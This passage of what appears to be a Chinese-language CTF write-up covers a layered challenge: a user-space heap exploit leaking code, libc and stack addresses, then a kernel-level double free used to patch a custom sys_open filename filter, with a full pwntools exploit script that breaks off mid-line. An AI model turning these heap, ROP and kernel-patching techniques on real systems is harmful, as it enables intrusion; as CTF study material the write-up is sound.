class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(elf.address + magic_limit_address) + p64(<span class="number">0xff</span>)</span><br><span class="line">edit_content(<span class="number">10</span>, payload)</span><br><span class="line">edit_content(<span class="number">9</span>, p32(<span class="number">0xff</span>) + p32(<span class="number">0x1</span>))</span><br><span class="line"></span><br><span class="line">magic(<span class="number">9</span>, <span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;[+]libc: &quot;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">edit_content(<span class="number">9</span>, p32(<span class="number">0xff</span>) + p32(<span class="number">0x1</span>))</span><br><span class="line">magic(<span class="number">9</span>, <span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;[+]stack: &quot;</span>)</span><br><span class="line">stack_address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;stack address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack_address)))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(stack_address + <span class="number">0x48</span>) + p64(<span class="number">0x200</span>)</span><br><span class="line">edit_content(<span class="number">10</span>, payload)</span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x000000000002155f</span> + libc.address</span><br><span class="line">p_rsi_r = <span class="number">0x0000000000023e8a</span> + libc.address</span><br><span class="line">p_rdx_r = <span class="number">0x0000000000001b96</span> + libc.address</span><br><span class="line">p_rax_r = <span class="number">0x0000000000043a78</span> + libc.address</span><br><span class="line">syscall = <span class="number">0x00000000000d29d5</span> + libc.address</span><br><span class="line">jmp_rsp = <span class="number">0x0000000000002b1d</span> + libc.address</span><br><span class="line">push_rax = <span class="number">0x000000000001e8a8</span> + libc.address</span><br><span class="line">mov_rdx_rax = <span class="number">0x00000000001417ad</span> + libc.address</span><br><span class="line">mov_rsi_rdx_jmp_rcx = <span class="number">0x0000000000153cd9</span> + libc.address</span><br><span class="line">p_rcx_rbx_r = <span class="number">0x0000000000103daa</span> + libc.address</span><br><span class="line"></span><br><span class="line">flag_str_address = stack_address + <span class="number">0x48</span> + <span class="number">0xe0</span></span><br><span class="line"></span><br><span class="line">flag_write_address = flag_str_address + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">shellcode += asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rbp, rax</span></span><br><span class="line"><span class="string">    mov rdi, rbp</span></span><br><span class="line"><span class="string">    mov rsi, 0x1000</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    mov rax, 0xa</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rsi, rbp</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    mov rax, 0x1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    flag: .string &quot;flag&quot;</span></span><br><span class="line"><span class="string">    buf:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x173E)&quot;)</span></span><br><span class="line">edit_content(<span class="number">9</span>, p64(jmp_rsp) + shellcode)</span><br><span class="line"><span class="comment"># edit_content(9, p64(jmp_rsp) + shellcode)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="bypass-kernel"><a href="#bypass-kernel" class="headerlink" title="bypass kernel"></a>bypass kernel</h3><p>这个是参考官方的<code>WP</code>。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201023172007.png" alt="图片无法显示，请联系作者" title=" "><p>说明这个函数调用表是一个<code>0x2333</code>大小的表，在处理系统调用号为<code>0x2333</code>的时候实现了一个自己的函数，我们看一下，实现了一个简单的菜单，主要有<code>new,show,edit,delete</code>四个功能。也就是可以从用户空间分配内核空间的堆块。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201023172618.png" alt="图片无法显示，请联系作者" title=" "><p>这里主要存在了两个漏洞，一个是<code>show</code>中的任意读漏洞，另一个就是<code>delete</code>函数中的<code>UAF</code>漏洞。由于<code>kernel</code>对用户空间进行的<code>open</code>进行了过滤，并且只能打开<code>flag</code>，因此这一步我们需要达到内核任意写的效果，通过内核的任意写改写内核代码中<code>open</code>的过滤的规则，从而可以打开任意的文件。</p><p>不过这里的<code>kmalloc,kfree</code>是作者自己编写的，我们需要逆向一下，逆向之后的代码贴在后面了，从逆向结果中我们可以得到<code>chunk</code>的结构如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|    size    |    0    | &lt;&lt; chunk header</span><br><span class="line">|     fd     |---------| &lt;&lt; chunk</span><br></pre></td></tr></table></figure><p>分配<code>chunk</code>的时候<code>size</code>需要是<code>0x10</code>对齐的，并且分配出来的<code>chunk</code>是以<code>0x80</code>为单位。堆的管理共分为两个部分，称之为<code>unsorted bin</code>和<code>sorted bin</code>。分配的时候如果没有特殊的情况则首先从<code>sorted bin</code>中进行分配，<code>sorted bin</code>中的堆块是按照从小到大的顺序进行排列的，如果<code>sorted bin</code>中没有合适的堆块，那么则在<code>unsorted bin</code>中分配。在释放的时候如果堆块和<code>unsorted bin</code>相邻，则将释放的堆块和<code>unsorted bin</code>进行合并。</p><p>可以看到<code>kernel</code>内部的堆块分配和释放除了对<code>size</code>进行了检查之外其他的并没有任何的安全检查。我们可以利用<code>double free</code>分配堆块到<code>buf_list(0x159c0)</code>中，利用<code>size_list(0x159c8)</code>中记录的堆块<code>size</code>作为伪造堆块的<code>size</code>。</p><p>各个重要结构体的偏移如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">buf_list-&gt;0x159c0</span><br><span class="line">size_list-&gt;0x159c8</span><br><span class="line">unsorted bin-&gt;0x15AC0</span><br><span class="line">unsorted bin size-&gt;0x15AC8</span><br><span class="line">sorted bins-&gt;0x15AE0</span><br></pre></td></tr></table></figure><ul><li>首先构造<code>double free</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode = add_kernel(<span class="number">0</span>, <span class="number">0xf0</span>) * <span class="number">30</span> <span class="comment"># 防止kernel中原有的chunk的干扰（删除也可）</span></span><br><span class="line">shellcode = add_kernel(<span class="number">0</span>, <span class="number">0x100</span>) <span class="comment"># fake chunk size</span></span><br><span class="line">shellcode += add_kernel(<span class="number">1</span>, <span class="number">0xf0</span>)</span><br><span class="line">shellcode += add_kernel(<span class="number">2</span>, <span class="number">0xf0</span>)</span><br><span class="line">shellcode += add_kernel(<span class="number">3</span>, <span class="number">0xf0</span>)</span><br><span class="line">shellcode += delete_kernel(<span class="number">1</span>) * <span class="number">2</span> <span class="comment"># double free</span></span><br><span class="line"><span class="comment"># shellcode += asm(&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># dbg:</span></span><br><span class="line"><span class="comment">#     jmp dbg;</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br></pre></td></tr></table></figure><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201025191440.png" alt="图片无法显示，请联系作者" title=" "><p><code>/dev/zero</code>就是<code>hypervisor</code>监管的内存了，内核空间和用户空间都在这里，调试的方法就是在<code>shellcode</code>中加上无限循环的<code>shellcode</code>，在程序陷入循环的时候使用<code>gdb attach</code>上去，查看内存是否发生了改变。从上面我们可以看到已经出现了<code>double free</code>。</p><ul><li>覆写<code>free chunk-&gt;fd</code>指向<code>size_list</code>，分配得到<code>chunk_list</code>的堆块，此时我们即可以控制<code>chunk_list</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode += asm(shellcraft.read(<span class="number">0</span>, stack_address, <span class="number">0xf0</span>)) <span class="comment"># 读取我们需要修改改的内容</span></span><br><span class="line">shellcode += edit_kernel(<span class="number">1</span>, <span class="number">3</span>, stack_address)</span><br><span class="line">shellcode += add_kernel(<span class="number">4</span>, <span class="number">0xf0</span>)</span><br><span class="line">shellcode += add_kernel(<span class="number">5</span>, <span class="number">0xf0</span>) <span class="comment"># chunk_list buf</span></span><br></pre></td></tr></table></figure><ul><li>覆写<code>chunk_list</code>指向<code>open</code>函数的代码段，覆写<code>open</code>的代码使得文件名的过滤失效。首先我们看一下代码在什么位置。</li></ul><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201025185431.png" alt="图片无法显示，请联系作者" title=" "><p>只要将<code>0xb73</code>处的<code>jnz</code>条件跳转<code>patch</code>掉就可以打开任意的文件了。所以我们将<code>chunk_list</code>中的某一个<code>chunk</code>的<code>ptr</code>指向该地址，随后修改。</p><ul><li><code>patch sys_open</code>调用，打开任意文件。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode += edit_kernel(<span class="number">5</span>, <span class="number">0xb</span>, stack_address+<span class="number">0x8</span>) <span class="comment"># write sys_open code address to chunk_list</span></span><br><span class="line">shellcode += edit_kernel(<span class="number">2</span>, <span class="number">2</span>, stack_address+<span class="number">0x20</span>) <span class="comment"># patch sys_open</span></span><br></pre></td></tr></table></figure><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201025192607.png" alt="图片无法显示，请联系作者" title=" "><p>从上图中我们可以看到已经成功<code>patch</code>了<code>sys_open</code>的函数，现在可以打开任意的文件了。之后就是打开<code>flag</code>文件读取<code>flag</code>的过程了，题目中给出了第二个<code>flag</code>文件的文件名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag_xmzyshypnctql&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">shellcode += asm(shellcraft.read(<span class="number">3</span>, stack_address, <span class="number">0x40</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>, stack_address, <span class="number">0x40</span>))</span><br><span class="line">shellcode += asm(shellcraft.exit(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>其中<code>stack</code>中的内容如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\xc8\x59\x01&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0xdeadbeef</span>) * <span class="number">2</span> + <span class="string">b&#x27;\x73\x0b\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">2</span></span><br></pre></td></tr></table></figure><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./hellouser&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./hellouser&quot;</span>)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(argv=[<span class="string">&quot;./hellovirtual&quot;</span>, <span class="string">&quot;./hellokernel&quot;</span>, <span class="string">&quot;./ld.so.2&quot;</span>, <span class="string">&quot;./hellouser&quot;</span>])</span><br><span class="line">    <span class="comment"># p = process([file_path])</span></span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *$rebase(0x13a8)\nb *$rebase(0x14da)&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;10.104.255.213&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&quot;1&quot;</span>, name=<span class="string">b&quot;1\n&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;team name:&quot;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;slogan size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;team slogan:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;team id:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_content</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your team id:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;new slogan:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_name</span>(<span class="params">index, name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your team id:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;new name:&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>(<span class="params">index, magic_index</span>):</span><br><span class="line">    magic_dic = [<span class="string">&quot;stackbase&quot;</span>, <span class="string">&quot;codebase&quot;</span>, <span class="string">&quot;libcbase&quot;</span>]</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;4919&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your team id:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;do you want?&quot;</span>, magic_dic[magic_index])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_kernel</span>(<span class="params">index, size</span>):</span><br><span class="line">    <span class="keyword">return</span> asm(</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rax, 0x2333;</span></span><br><span class="line"><span class="string">        mov rdi, 1;</span></span><br><span class="line"><span class="string">        mov rsi, %d;</span></span><br><span class="line"><span class="string">        mov rdx, %d;</span></span><br><span class="line"><span class="string">        xor r8, r8;</span></span><br><span class="line"><span class="string">        syscall;</span></span><br><span class="line"><span class="string">         &#x27;&#x27;&#x27;</span>% (index, size)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_kernel</span>(<span class="params">index, size, offset</span>):</span><br><span class="line">    <span class="keyword">return</span> asm(</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rax, 0x2333;</span></span><br><span class="line"><span class="string">        mov rdi, 2;</span></span><br><span class="line"><span class="string">        mov rsi, %d;</span></span><br><span class="line"><span class="string">        mov rdx, %d;</span></span><br><span class="line"><span class="string">        mov rcx, %d;</span></span><br><span class="line"><span class="string">        xor rdx, rdx;</span></span><br><span class="line"><span class="string">        xor r8, r8;</span></span><br><span class="line"><span class="string">        syscall;</span></span><br><span class="line"><span class="string">         &#x27;&#x27;&#x27;</span>% (index, size, offset)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_kernel</span>(<span class="params">index, size, content_buf</span>):</span><br><span class="line">    <span class="keyword">return</span> asm(</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rax, 0x2333;</span></span><br><span class="line"><span class="string">        mov rdi, 3;</span></span><br><span class="line"><span class="string">        mov rsi, %d;</span></span><br><span class="line"><span class="string">        xor rcx, rcx;</span></span><br><span class="line"><span class="string">        mov rdx, %d;</span></span><br><span class="line"><span class="string">        movabs r8, %ld;</span></span><br><span class="line"><span class="string">        syscall;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> % (index, size, content_buf)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_kernel</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="keyword">return</span> asm(</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rax, 0x2333;</span></span><br><span class="line"><span class="string">        mov rdi, 4;</span></span><br><span class="line"><span class="string">        mov rsi, %d;</span></span><br><span class="line"><span class="string">        xor rdx, rdx;</span></span><br><span class="line"><span class="string">        xor rcx, rcx;</span></span><br><span class="line"><span class="string">        xor r8, r8;</span></span><br><span class="line"><span class="string">        syscall;</span></span><br><span class="line"><span class="string">         &#x27;&#x27;&#x27;</span>% (index)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic_limit_address = <span class="number">0x2030b8</span></span><br><span class="line">name = <span class="string">&quot;1&quot;</span> * <span class="number">0x1</span></span><br><span class="line">p.sendafter(<span class="string">&quot;you name:)&quot;</span>, name)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">b&quot;1&quot;</span>, cyclic(<span class="number">29</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0xa8</span>, <span class="string">b&quot;1&quot;</span>, cyclic(<span class="number">29</span>))</span><br><span class="line">add(<span class="number">0x8</span>, <span class="string">b&quot;1&quot;</span>, cyclic(<span class="number">29</span>))</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&quot;1&quot;</span>, cyclic(<span class="number">29</span>))</span><br><span class="line">edit_name(<span class="number">10</span>, <span class="string">b&quot;1&quot;</span> * <span class="number">29</span>)</span><br><span class="line">magic(<span class="number">10</span>, <span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;[+]code: &quot;</span>)</span><br><span class="line">elf.address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>) - <span class="number">0xcba</span></span><br><span class="line">log.success(<span class="string">&quot;elf address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(elf.address)))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(elf.address + magic_limit_address) + p64(<span class="number">0xff</span>)</span><br><span class="line">edit_content(<span class="number">10</span>, payload)</span><br><span class="line">edit_content(<span class="number">9</span>, p32(<span class="number">0xff</span>) + p32(<span class="number">0x1</span>))</span><br><span class="line"></span><br><span class="line">magic(<span class="number">9</span>, <span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;[+]libc: &quot;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">edit_content(<span class="number">9</span>, p32(<span class="number">0xff</span>) + p32(<span class="number">0x1</span>))</span><br><span class="line">magic(<span class="number">9</span>, <span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;[+]stack: &quot;</span>)</span><br><span class="line">stack_address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;stack address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack_address)))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(stack_address + <span class="number">0x48</span>) + p64(<span class="number">0x200</span>)</span><br><span class="line">edit_content(<span class="number">10</span>, payload)</span><br><span class="line">jmp_rsp = <span class="number">0x0000000000002b1d</span> + libc.address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = add_kernel(<span class="number">0</span>, <span class="number">0xf0</span>)*<span class="number">30</span></span><br><span class="line">shellcode += add_kernel(<span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += add_kernel(<span class="number">1</span>, <span class="number">0xf0</span>)</span><br><span class="line">shellcode += add_kernel(<span class="number">2</span>, <span class="number">0xf0</span>)</span><br><span class="line">shellcode += add_kernel(<span class="number">3</span>, <span class="number">0xf0</span>)</span><br><span class="line">shellcode += delete_kernel(<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">shellcode += asm(shellcraft.read(<span class="number">0</span>,stack_address,<span class="number">0xf0</span>))</span><br><span class="line">shellcode += edit_kernel(<span class="number">1</span>, <span class="number">3</span>, stack_address)</span><br><span class="line">shellcode += add_kernel(<span class="number">4</span>, <span class="number">0xf0</span>)</span><br><span class="line">shellcode += add_kernel(<span class="number">5</span>, <span class="number">0xf0</span>)</span><br><span class="line">shellcode += edit_kernel(<span class="number">5</span>, <span class="number">0xb</span>, stack_address+<span class="number">0x8</span>)</span><br><span class="line">shellcode += edit_kernel(<span class="number">2</span>, <span class="number">2</span>, stack_address+<span class="number">0x20</span>)</span><br><span class="line">shellcode += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag_xmzyshypnctql&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">shellcode += asm(shellcraft.read(<span class="number">3</span>, stack_address, <span class="number">0x40</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>, stack_address, <span class="number">0x40</span>))</span><br><span class="line">shellcode += asm(shellcraft.exit(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">orw_shellcode = asm(shellcraft.read(<span class="number">0</span>, stack_address + <span class="number">0x30</span> + <span class="number">0x50</span>, <span class="number">0x1000</span>))</span><br><span 